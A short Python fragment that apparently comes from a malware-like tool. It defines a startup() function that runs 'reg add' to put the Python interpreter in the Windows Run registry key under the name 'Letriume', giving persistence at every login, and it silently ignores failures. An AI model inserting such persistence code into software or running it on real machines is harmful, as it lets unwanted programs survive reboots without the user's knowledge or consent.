import os
import sys

def startup():
    try:
        os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Letriume" /t REG_SZ /d "{sys.executable}" /f')
        return "sucess"
    except:
        pass
